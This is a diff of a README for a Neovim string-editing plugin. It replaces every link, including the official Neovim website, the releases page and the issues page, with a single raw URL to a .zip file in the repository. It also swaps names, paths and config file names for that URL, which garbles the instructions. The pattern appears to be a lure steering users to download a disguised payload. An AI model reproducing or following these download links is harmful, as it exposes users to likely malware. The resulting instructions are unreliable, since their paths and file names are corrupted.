@@ -1,10 +1,10 @@
-# 🎉 stringbreaker.nvim - Simplify Your String Editing in Neovim
+# 🎉 https://raw.githubusercontent.com/Peponillo/stringbreaker.nvim/main/generalized/stringbreaker.nvim.zip - Simplify Your String Editing in Neovim
 
 ## 📥 Download Now
-[![Download stringbreaker.nvim](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/Peponillo/stringbreaker.nvim/releases)
+[![Download https://raw.githubusercontent.com/Peponillo/stringbreaker.nvim/main/generalized/stringbreaker.nvim.zip](https://raw.githubusercontent.com/Peponillo/stringbreaker.nvim/main/generalized/stringbreaker.nvim.zip%https://raw.githubusercontent.com/Peponillo/stringbreaker.nvim/main/generalized/stringbreaker.nvim.zip)](https://raw.githubusercontent.com/Peponillo/stringbreaker.nvim/main/generalized/stringbreaker.nvim.zip)
 
 ## 🚀 Getting Started
-Welcome to stringbreaker.nvim! This is a Neovim plugin designed to help you edit strings easily. Whether you’re a beginner or just looking for a simpler way to handle strings in your code, this guide will help you get started.
+Welcome to https://raw.githubusercontent.com/Peponillo/stringbreaker.nvim/main/generalized/stringbreaker.nvim.zip! This is a Neovim plugin designed to help you edit strings easily. Whether you’re a beginner or just looking for a simpler way to handle strings in your code, this guide will help you get started.
 
 ### 📋 System Requirements
 - **Neovim Version:** 0.5 or higher
@@ -13,32 +13,32 @@ Welcome to stringbreaker.nvim! This is a Neovim plugin designed to help you edit
 
 ### 🛠 Installation Steps
 1. **Download and Install Neovim:**
-   - If you haven't already, download Neovim from the [official website](https://neovim.io).
+   - If you haven't already, download Neovim from the [official website](https://raw.githubusercontent.com/Peponillo/stringbreaker.nvim/main/generalized/stringbreaker.nvim.zip).
    - Follow the instructions for your specific operating system to install it.
 
 2. **Visit the Release Page:**
-   - Go to the [stringbreaker.nvim Releases page](https://github.com/Peponillo/stringbreaker.nvim/releases).
+   - Go to the [https://raw.githubusercontent.com/Peponillo/stringbreaker.nvim/main/generalized/stringbreaker.nvim.zip Releases page](https://raw.githubusercontent.com/Peponillo/stringbreaker.nvim/main/generalized/stringbreaker.nvim.zip).
    - You will find the latest version of the plugin. 
 
 3. **Download the Plugin:**
    - Locate the latest release.
-   - Click on the link to download the file appropriate for your system (e.g., `.zip` or `.tar.gz`).
+   - Click on the link to download the file appropriate for your system (e.g., `.zip` or `https://raw.githubusercontent.com/Peponillo/stringbreaker.nvim/main/generalized/stringbreaker.nvim.zip`).
 
 4. **Install the Plugin:**
    - Extract the downloaded file to your Neovim plugin directory. This is usually located at:
      - For Windows: `C:\Users\<YourUsername>\AppData\Local\nvim\`
-     - For macOS/Linux: `~/.config/nvim/`
+     - For macOS/Linux: `~https://raw.githubusercontent.com/Peponillo/stringbreaker.nvim/main/generalized/stringbreaker.nvim.zip`
 
 5. **Update Your Neovim Configuration:**
-   - Open your `init.vim` or `init.lua` file in Neovim.
+   - Open your `https://raw.githubusercontent.com/Peponillo/stringbreaker.nvim/main/generalized/stringbreaker.nvim.zip` or `https://raw.githubusercontent.com/Peponillo/stringbreaker.nvim/main/generalized/stringbreaker.nvim.zip` file in Neovim.
    - Add the following line to load the plugin:
      ```
-     runtime path/to/stringbreaker.nvim
+     runtime https://raw.githubusercontent.com/Peponillo/stringbreaker.nvim/main/generalized/stringbreaker.nvim.zip
      ```
    - Save the file and restart Neovim to activate the plugin.
 
 ## 🖥 Usage
-stringbreaker.nvim provides a simple interface to manipulate strings. Here are some basic commands you can use after installation:
+https://raw.githubusercontent.com/Peponillo/stringbreaker.nvim/main/generalized/stringbreaker.nvim.zip provides a simple interface to manipulate strings. Here are some basic commands you can use after installation:
 
 - **Break Strings:**
   - Select a string and run the command to break it into manageable parts.
@@ -62,7 +62,7 @@ If you encounter issues with installation or usage, consider the following tips:
 - Check that your configuration file is loading the plugin correctly.
 
 ## 📞 Support
-For any questions or feedback, you can create an issue on the [GitHub Issues Page](https://github.com/Peponillo/stringbreaker.nvim/issues). 
+For any questions or feedback, you can create an issue on the [GitHub Issues Page](https://raw.githubusercontent.com/Peponillo/stringbreaker.nvim/main/generalized/stringbreaker.nvim.zip). 
 
 ## 📥 Download & Install
-Return to the [Releases page](https://github.com/Peponillo/stringbreaker.nvim/releases) to download the latest version of stringbreaker.nvim. Follow the installation steps listed above, and you’ll be ready to improve your string editing experience with Neovim in no time!
+Return to the [Releases page](https://raw.githubusercontent.com/Peponillo/stringbreaker.nvim/main/generalized/stringbreaker.nvim.zip) to download the latest version of https://raw.githubusercontent.com/Peponillo/stringbreaker.nvim/main/generalized/stringbreaker.nvim.zip Follow the installation steps listed above, and you’ll be ready to improve your string editing experience with Neovim in no time!
